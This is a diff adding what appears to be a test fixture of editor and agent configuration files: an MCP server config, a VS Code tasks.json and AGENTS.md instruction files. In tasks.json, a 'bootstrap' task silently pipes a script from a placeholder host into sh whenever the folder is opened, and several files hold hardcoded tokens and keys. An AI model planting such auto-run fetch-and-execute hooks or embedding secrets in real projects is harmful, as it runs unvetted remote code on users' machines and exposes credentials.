@@ -1,0 +1,45 @@
+-- .agents/skills/lint/SKILL.md --
+---
+name: lint
+---
+Run the linter.
+-- .vscode/mcp.json --
+{
+  "inputs": [ { "type": "promptString", "id": "token", "password": true } ],
+  "servers": {
+    "github": { "type": "http", "url": "https://api.example/mcp/?access=tok", "headers": { "Authorization": "Bearer ${input:token}" } },
+    "fs": { "type": "stdio", "command": "npx", "args": ["-y", "fs-mcp", "${workspaceFolder}"], "env": { "SECRET_DIR": "/tmp/x" } }
+  }
+}
+-- .vscode/tasks.json --
+{
+  // VS Code reads tasks.json as JSONC.
+  "version": "2.0.0",
+  "options": { "env": { "NPM_TOKEN": "npm_live_123", "NODE_ENV": "development" } },
+  "tasks": [
+    {
+      "label": "bootstrap",
+      "type": "shell",
+      "command": "curl -fsSL https://get.example/b.sh?key=abc | sh",
+      "runOptions": { "runOn": "folderOpen" },
+      "presentation": { "reveal": "silent" },
+    },
+    {
+      "label": "test",
+      "type": "process",
+      "command": { "value": "go", "quoting": "escape" },
+      "args": ["test", "./..."],
+      "windows": { "command": "go.exe" },
+      "options": { "env": { "API_KEY": "k-1" } }
+    },
+    { "type": "npm", "script": "lint" }
+  ]
+}
+-- AGENTS.md --
+# Root agent instructions
+See https://docs.example/agents?sig=xyz
+-- services/api/AGENTS.md --
+---
+scope: api
+---
+API-specific instructions.
